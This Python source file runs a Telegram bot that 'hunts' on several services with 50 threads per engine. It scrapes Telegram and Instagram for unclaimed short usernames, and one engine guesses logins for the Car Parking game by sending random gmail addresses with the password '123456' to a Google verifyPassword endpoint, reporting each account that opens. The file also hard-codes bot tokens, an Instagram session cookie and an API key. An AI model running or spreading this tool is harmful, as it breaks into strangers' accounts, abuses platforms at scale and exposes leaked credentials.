import telebot
import threading
import time
import random
import requests
from telebot import types
from telebot.apihelper import ApiTelegramException
from user_agent import generate_user_agent
from flask import Flask
from threading import Thread

# ==============================
# 1. Settings & Config
# ==============================
TOKEN_HUNT = '8501700333:AAHhi0bu4_Jwu_rw66Jy8OJ0e8i9AtvmAHE' 
TOKEN_ADMIN = '8506628064:AAFdS4tqtRiYEwz_oQfkDPUN7sfXlxdC6uc'
MY_ID = 6532708587
INSTA_COOKIE = 'ig_did=4944AD57-ABED-42D8-B969-C273EDD18AF9; datr=4GJnaa_N6he2n99QKW4vFmQe; mid=aWdi4AABAAHFuGo_SK5Yv5duSypp; ps_l=1; ps_n=1; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; csrftoken=v8pvj6ZZCbkz9MDqJgtTl4JAHSfsihzU; ds_user_id=69852408405; dpr=1.6121296882629395; wd=809x1069; sessionid=69852408405%3AocDRBFPSkVj6HK%3A19%3AAYgzcuEvL53dK8aG6lgrysFfOlFlFCjhDsif1tPjmQ; rur="RVA\\05469852408405\\0541800448129:01fe6d56dbca1f53f7cd5266f12659b4d3829fd803edbd2146beca8e986f2704f09c08f1"'
THREADS_COUNT = 50

bot_hunt = telebot.TeleBot(TOKEN_HUNT)
bot_admin = telebot.TeleBot(TOKEN_ADMIN)

# Control Flags
hunting_status = {}

# ==============================
# 2. Keep Alive (For 24/7 Hosting)
# ==============================
app = Flask('')

@app.route('/')
def home():
    return "<b>Bot is Running 24/7... @XQQ2X👑</b>"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ==============================
# 3. Helpers
# ==============================
def safe_send_message(bot, chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup)
    except ApiTelegramException as e:
        if e.error_code == 429:
            time.sleep(int(e.result_json['parameters']['retry_after']))
            return safe_send_message(bot, chat_id, text, reply_markup)
    except:
        return None

def safe_edit_message(bot, chat_id, message_id, text, reply_markup=None):
    try:
        bot.edit_message_text(text=text, chat_id=chat_id, message_id=message_id, reply_markup=reply_markup)
    except:
        pass

# ==============================
# 4. Data & Texts
# ==============================
database = {'users': set(), 'banned': set(), 'maintenance': {'tele': False, 'insta': False, 'cpm': False}}
stats = {'tele': {'checked': 0, 'hits': 0}, 'insta': {'checked': 0, 'hits': 0}, 'cpm': {'checked': 0, 'hits': 0}}
user_languages = {}

TEXTS = {
    'ar': {
        'start': "👋 مرحباً بك في بوت الصيد المطور\n👨‍💻 المطور: @XQQ2X👑\n\n👇 اختر الخدمة:",
        'hunt_tele': "🔹 صيد تليجرام",
        'hunt_insta': "🔸 صيد انستقرام",
        'hunt_cpm': "🏎 صيد Car Parking",
        'choose_country': "📍 اختر الدولة:",
        'running': "🚀 جاري الصيد (50 خيط)...\nاضغط إيقاف لإلغاء العملية.",
        'stopped': "🛑 تم إيقاف الصيد بنجاح.",
        'maint': "⚠️ الخدمة في الصيانة حالياً.",
        'banned': "⛔ أنت محظور!",
        'hit': "✅ **تم الصيد!**\n\n{}",
        'stats_msg': "📊 **إحصائيات ({})**\n━━━━━━━━━━━━\n🔍 الفحص: {}\n✅ المتاح: {}",
        'stop_btn': "🛑 إيقاف الصيد"
    },
    'en': {
        'start': "👋 Welcome Hunter\n👨‍💻 Dev: @XQQ2X👑\n\n👇 Choose Service:",
        'hunt_tele': "🔹 Telegram Hunt",
        'hunt_insta': "🔸 Instagram Hunt",
        'hunt_cpm': "🏎 Car Parking Hunt",
        'choose_country': "📍 Choose Country:",
        'running': "🚀 Hunting started...\nPress Stop to cancel.",
        'stopped': "🛑 Hunting Stopped.",
        'maint': "⚠️ Maintenance mode.",
        'banned': "⛔ Banned!",
        'hit': "✅ **HIT FOUND!**\n\n{}",
        'stats_msg': "📊 **Stats ({})**\n━━━━━━━━━━━━\n🔍 Checked: {}\n✅ Hits: {}",
        'stop_btn': "🛑 Stop Hunting"
    },
    'ru': {
        'start': "👋 Добро пожаловать\n👨‍💻 Dev: @XQQ2X👑\n\n👇 Выберите:",
        'hunt_tele': "🔹 Telegram",
        'hunt_insta': "🔸 Instagram",
        'hunt_cpm': "🏎 Car Parking",
        'choose_country': "📍 Выберите:",
        'running': "🚀 Запуск...\nНажмите Стоп для отмены.",
        'stopped': "🛑 Остановлено.",
        'maint': "⚠️ Обслуживание.",
        'banned': "⛔ Бан!",
        'hit': "✅ **УСПЕШНО!**\n\n{}",
        'stats_msg': "📊 **Статистика ({})**\n━━━━━━━━━━━━\n🔍 Проверено: {}\n✅ Найдено: {}",
        'stop_btn': "🛑 Стоп"
    }
}

def get_text(chat_id, key):
    lang = user_languages.get(chat_id, 'ar')
    return TEXTS[lang][key]

# ==============================
# 5. Engines
# ==============================
def telegram_engine(chat_id):
    chars = 'QWERTYUIOPASD12345FGHJKLZXCVBNM67890'
    while hunting_status.get(chat_id, False):
        try:
            stats['tele']['checked'] += 1
            u = "".join(random.choices(chars, k=5))
            if 'If you have Telegram' in requests.get(f"https://t.me/{u}", timeout=5).text:
                stats['tele']['hits'] += 1
                safe_send_message(bot_hunt, chat_id, get_text(chat_id, 'hit').format(f"🦅 User: @{u}"))
            time.sleep(0.1)
        except:
            continue

def instagram_engine(chat_id):
    chars = 'abcdefghijklmnopqrstuvwxyz._1234567890'
    headers = {'User-Agent': generate_user_agent(), 'Cookie': INSTA_COOKIE}
    while hunting_status.get(chat_id, False):
        try:
            u = "".join(random.choices(chars, k=random.randint(4,6)))
            r = requests.get(f"https://www.instagram.com/{u}/", headers=headers, timeout=5)
            stats['insta']['checked'] += 1
            if r.status_code == 404:
                stats['insta']['hits'] += 1
                safe_send_message(bot_hunt, chat_id, get_text(chat_id, 'hit').format(f"📸 User: {u}"))
            time.sleep(0.5)
        except:
            time.sleep(1)

def cpm_engine(chat_id, country):
    auth_url = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
    while hunting_status.get(chat_id, False):
        try:
            stats['cpm']['checked'] += 1
            e, p = f"user{random.randint(10,9999)}@gmail.com", "123456"
            if 'idToken' in requests.post(auth_url, json={'email': e, 'password': p, 'returnSecureToken': True}, timeout=5).json():
                stats['cpm']['hits'] += 1
                safe_send_message(bot_hunt, chat_id, get_text(chat_id, 'hit').format(f"🏎 E: `{e}`\nP: `{p}`\nC: {country}"))
            time.sleep(0.1)
        except:
            continue

def stats_updater(chat_id, msg_id, mode):
    while hunting_status.get(chat_id, False):
        try:
            time.sleep(8)
            c, h = stats[mode]['checked'], stats[mode]['hits']
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(get_text(chat_id, 'stop_btn'), callback_data='stop_hunt'))
            safe_edit_message(bot_hunt, chat_id, msg_id, get_text(chat_id, 'stats_msg').format(mode, c, h), reply_markup=markup)
        except:
            continue

# ==============================
# 6. Admin & Main Logic
# ==============================
@bot_admin.message_handler(commands=['start'])
def admin_dash(message):
    if message.chat.id != MY_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    for m in ['tele', 'insta', 'cpm']:
        st = '🔴' if database['maintenance'][m] else '🟢'
        markup.add(types.InlineKeyboardButton(f"{m.upper()}: {st}", callback_data=f'toggle_{m}'))
    markup.add(types.InlineKeyboardButton("📈 Report", callback_data='report'))
    safe_send_message(bot_admin, message.chat.id, "👮‍♂️ **Dashboard**", reply_markup=markup)

@bot_admin.callback_query_handler(func=lambda call: True)
def admin_callbacks(call):
    if call.data.startswith('toggle_'):
        mode = call.data.split('_')[1]
        database['maintenance'][mode] = not database['maintenance'][mode]
        admin_dash(call.message)
    elif call.data == 'report':
        safe_send_message(bot_admin, call.message.chat.id, f"👥 Users: {len(database['users'])}\n🚫 Banned: {len(database['banned'])}")

@bot_hunt.message_handler(commands=['start'])
def hunt_start(message):
    uid = message.chat.id
    database['users'].add(uid)
    markup = types.InlineKeyboardMarkup()
    for l, n in [('ar', 'العربية 🇮🇶'), ('en', 'English 🇺🇸'), ('ru', 'Русский 🇷🇺')]:
        markup.add(types.InlineKeyboardButton(n, callback_data=f'lang_{l}'))
    
    # Try to pin the message
    try:
        sent = safe_send_message(bot_hunt, uid, "Choose Language / اختر اللغة:", reply_markup=markup)
        bot_hunt.pin_chat_message(uid, sent.message_id)
    except:
        pass

@bot_hunt.callback_query_handler(func=lambda call: True)
def hunt_callbacks(call):
    uid = call.message.chat.id
    if uid in database['banned']: return
    
    if call.data.startswith('lang_'):
        user_languages[uid] = call.data.split('_')[1]
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton(get_text(uid, 'hunt_tele'), callback_data='run_tele'),
            types.InlineKeyboardButton(get_text(uid, 'hunt_insta'), callback_data='run_insta'),
            types.InlineKeyboardButton(get_text(uid, 'hunt_cpm'), callback_data='choose_cpm')
        )
        bot_hunt.edit_message_text(chat_id=uid, message_id=call.message.message_id, text=get_text(uid, 'start'), reply_markup=markup)
        return

    if call.data == 'stop_hunt':
        hunting_status[uid] = False
        bot_hunt.answer_callback_query(call.id, "Stopping...")
        safe_edit_message(bot_hunt, uid, call.message.message_id, get_text(uid, 'stopped'))
        return

    if call.data == 'choose_cpm':
        markup = types.InlineKeyboardMarkup(row_width=2)
        for c in ["🇸🇦", "🇹🇷", "🇷🇺"]:
            markup.add(types.InlineKeyboardButton(c, callback_data=f'cpm_{c}'))
        safe_edit_message(bot_hunt, uid, call.message.message_id, get_text(uid, 'choose_country'), reply_markup=markup)
        return

    mode = 'cpm' if 'cpm' in call.data else 'tele' if 'tele' in call.data else 'insta'
    
    if database['maintenance'][mode] and uid != MY_ID:
        bot_hunt.answer_callback_query(call.id, get_text(uid, 'maint'), show_alert=True)
        return

    hunting_status[uid] = True
    markup_stop = types.InlineKeyboardMarkup()
    markup_stop.add(types.InlineKeyboardButton(get_text(uid, 'stop_btn'), callback_data='stop_hunt'))
    
    bot_hunt.answer_callback_query(call.id, "Started ✅")
    safe_send_message(bot_hunt, uid, get_text(uid, 'running'))
    safe_send_message(bot_admin, MY_ID, f"🔔 **New Run**\nUser: {uid}\nService: {mode}")

    target = telegram_engine if mode == 'tele' else instagram_engine if mode == 'insta' else cpm_engine
    args = (uid,) if mode != 'cpm' else (uid, call.data)

    msg = safe_send_message(bot_hunt, uid, "📊 Loading...", reply_markup=markup_stop)
    
    threading.Thread(target=stats_updater, args=(uid, msg.message_id, mode), daemon=True).start()
    
    for _ in range(THREADS_COUNT):
        threading.Thread(target=target, args=args, daemon=True).start()

# ==============================
# 7. Start
# ==============================
print("BOTS RUNNING SAFE... @XQQ2X👑")
keep_alive() # Run Flask Server
threading.Thread(target=bot_admin.infinity_polling, daemon=True).start()
bot_hunt.infinity_polling()
